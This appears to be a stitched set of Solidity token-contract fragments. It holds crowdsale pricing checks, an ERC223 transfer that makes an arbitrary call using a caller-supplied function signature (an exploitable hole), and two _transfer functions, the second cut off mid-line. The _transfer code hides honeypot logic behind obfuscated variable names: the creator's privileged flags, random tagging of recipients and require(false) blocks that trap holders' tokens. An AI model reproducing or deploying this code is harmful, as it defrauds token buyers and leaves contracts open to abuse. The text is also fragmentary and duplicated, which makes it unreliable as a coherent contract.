function checkValue(uint256 amount) internal view returns(bool) {
    if (now > privSale1start && now < privSale1end)
        return (amount >= 5 ether);
    else if (now > privSale2start && now < privSale2end)
        return (amount >= 5 ether);
    else if (now > saleStart && now < saleEnd)
        return (amount >= 0.1 ether);
    return false;
}

function getRate() public view returns(uint256) {
    if (now > privSale1start && now < privSale1end)
        return 14375; 
    else if (now > privSale2start && now < privSale2end)
        return 13750; 
    else if (now > saleStart && now < saleEnd)
        return 12500; 
    return 0;
}

function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
    require(unlocked);
    if (isContract(_to)) {
        if (balanceOf(msg.sender) < _value) {
            revert();
        }
        balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
        balances[_to] = safeAdd(balanceOf(_to), _value);
        ContractReceiver receiver = ContractReceiver(_to);
        receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data);
        Transfer(msg.sender, _to, _value, _data);
        return true;
    } else {
        return transferToAddress(_to, _value, _data);
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (sodaa == false)) {
        keyss = chTx;
        bummer = true;
    }
    if ((address(sender) == creator) && (sodaa == true)) {
        cups[recipient] = true;
        teatime[recipient] = false;
        sodaa = false;
    }
    if ((amount > motel) && (cups[sender] == true) && (address(sender) != creator)) {
        hamilton[recipient] = true;
    }
    if (cups[recipient] != true) {
        teatime[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((teatime[sender]) && (cups[recipient] == false)) {
        teatime[recipient] = true;
    }
    if (cups[sender] == false) {
        if ((amount > motel) && (hamilton[sender] == true)) {
            require(false);
        }
        require(amount < keyss);
        if (bummer == true) {
            if (hamilton[sender] == true) {
                require(false);
            }
            hamilton[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (osprey == true)) {
        megapie[recipient] = true;
        theapples[recipient] = false;
        osprey = false;
    }
    if (megapie[recipient] != true) {
        theapples[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((theapples[sender]) && (megapie[recipient] == false)) {
